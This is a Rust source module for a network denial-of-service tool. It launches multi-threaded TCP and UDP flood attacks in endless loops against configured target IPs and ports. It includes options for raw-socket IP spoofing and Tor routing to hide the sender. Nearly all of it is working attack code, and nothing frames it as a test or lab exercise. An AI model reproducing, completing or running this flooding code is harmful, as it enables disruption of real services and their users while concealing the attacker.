use anyhow::Result;
use bytes::Bytes;
use colored::*;
use log::{error, info};
use rand::Rng;
use std::net::{IpAddr, SocketAddr};
use std::sync::Arc;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::time::{interval, sleep};
use tokio::io::AsyncWriteExt;

use crate::tor::TorClient;

pub struct AttackConfig {
    pub targets: Vec<IpAddr>,
    pub ports: Vec<u16>,
    pub threads: u32,
    pub packet_size: usize,
    pub rate_limit: Duration,
    pub use_spoofing: bool,
    pub use_tor: bool,
}

pub async fn tcp_flood(config: AttackConfig) -> Result<()> {
    println!("{}", "Starting TCP Flood Attack...".bright_green().bold());
    
    let config = Arc::new(config);
    let tor_client = if config.use_tor {
        Some(Arc::new(TorClient::new().await?))
    } else {
        None
    };
    
    let mut handles = Vec::new();
    
    for _ in 0..config.threads {
        let config_clone = Arc::clone(&config);
        let tor_clone = tor_client.as_ref().map(Arc::clone);
        
        let handle = tokio::spawn(async move {
            tcp_flood_worker(config_clone, tor_clone).await
        });
        
        handles.push(handle);
    }
    
    // Wait for all threads to complete
    for handle in handles {
        if let Err(e) = handle.await {
            error!("Thread error: {}", e);
        }
    }
    
    Ok(())
}

pub async fn udp_flood(config: AttackConfig) -> Result<()> {
    println!("{}", "Starting UDP Flood Attack...".bright_green().bold());
    
    let config = Arc::new(config);
    let mut handles = Vec::new();
    
    for _ in 0..config.threads {
        let config_clone = Arc::clone(&config);
        
        let handle = tokio::spawn(async move {
            udp_flood_worker(config_clone).await
        });
        
        handles.push(handle);
    }
    
    // Wait for all threads to complete
    for handle in handles {
        if let Err(e) = handle.await {
            error!("Thread error: {}", e);
        }
    }
    
    Ok(())
}

async fn tcp_flood_worker(config: Arc<AttackConfig>, tor_client: Option<Arc<TorClient>>) {
    let payload = generate_payload(config.packet_size);
    let mut interval = interval(config.rate_limit);
    
    loop {
        interval.tick().await;
        
        for &target_ip in &config.targets {
            for &port in &config.ports {
                let addr = SocketAddr::new(target_ip, port);
                
                match send_tcp_packet(&addr, &payload, &tor_client, config.use_spoofing).await {
                    Ok(_) => {
                        info!("TCP packet sent to {}:{}", target_ip, port);
                        println!("{} TCP packet sent to {}:{}", 
                               "✓".bright_green(), 
                               target_ip.to_string().bright_cyan(), 
                               port.to_string().bright_yellow());
                    }
                    Err(e) => {
                        error!("Failed to send TCP packet to {}:{} - {}", target_ip, port, e);
                    }
                }
                
                // Small delay to avoid overwhelming
                let delay_ms = rand::thread_rng().gen_range(1..10);
                sleep(Duration::from_millis(delay_ms)).await;
            }
        }
    }
}

async fn udp_flood_worker(config: Arc<AttackConfig>) {
    let payload = generate_payload(config.packet_size);
    let mut interval = interval(config.rate_limit);
    
    loop {
        interval.tick().await;
        
        for &target_ip in &config.targets {
            for &port in &config.ports {
                let addr = SocketAddr::new(target_ip, port);
                
                match send_udp_packet(&addr, &payload, config.use_spoofing).await {
                    Ok(_) => {
                        info!("UDP packet sent to {}:{}", target_ip, port);
                        println!("{} UDP packet sent to {}:{}", 
                               "✓".bright_green(), 
                               target_ip.to_string().bright_cyan(), 
                               port.to_string().bright_yellow());
                    }
                    Err(e) => {
                        error!("Failed to send UDP packet to {}:{} - {}", target_ip, port, e);
                    }
                }
                
                // Small delay to avoid overwhelming
                let delay_ms = rand::thread_rng().gen_range(1..10);
                sleep(Duration::from_millis(delay_ms)).await;
            }
        }
    }
}

async fn send_tcp_packet(
    addr: &SocketAddr,
    payload: &[u8],
    tor_client: &Option<Arc<TorClient>>,
    use_spoofing: bool,
) -> Result<()> {
    if let Some(_tor) = tor_client {
        // For Tor, we'll use reqwest with SOCKS proxy in the HTTP layer
        // Direct TCP over Tor is complex, so we skip this for now
        anyhow::bail!("Direct TCP over Tor not implemented in simplified version");
    } else if use_spoofing {
        // Use raw sockets with IP spoofing
        send_spoofed_tcp_packet(addr, payload).await?;
    } else {
        // Direct TCP connection
        let mut stream = TcpStream::connect(addr).await?;
        stream.write_all(payload).await?;
    }
    
    Ok(())
}

async fn send_udp_packet(addr: &SocketAddr, payload: &[u8], use_spoofing: bool) -> Result<()> {
    if use_spoofing {
        send_spoofed_udp_packet(addr, payload).await?;
    } else {
        use tokio::net::UdpSocket;
        let socket = UdpSocket::bind("0.0.0.0:0").await?;
        socket.send_to(payload, addr).await?;
    }
    
    Ok(())
}

async fn send_tcp_data<T: AsyncWriteExt + Unpin>(mut stream: T, payload: &[u8]) -> Result<()> {
    stream.write_all(payload).await?;
    Ok(())
}

async fn send_spoofed_tcp_packet(addr: &SocketAddr, payload: &[u8]) -> Result<()> {
    // Implementation for spoofed TCP packets using raw sockets
    // This requires root privileges and platform-specific code
    use crate::network::raw::RawSocket;
    
    let raw_socket = RawSocket::new()?;
    raw_socket.send_spoofed_tcp(addr, payload).await?;
    
    Ok(())
}

async fn send_spoofed_udp_packet(addr: &SocketAddr, payload: &[u8]) -> Result<()> {
    // Implementation for spoofed UDP packets using raw sockets
    use crate::network::raw::RawSocket;
    
    let raw_socket = RawSocket::new()?;
    raw_socket.send_spoofed_udp(addr, payload).await?;
    
    Ok(())
}

fn generate_payload(size: usize) -> Bytes {
    let mut rng = rand::thread_rng();
    let mut payload = vec![0u8; size];
    rng.fill(&mut payload[..]);
    Bytes::from(payload)
}
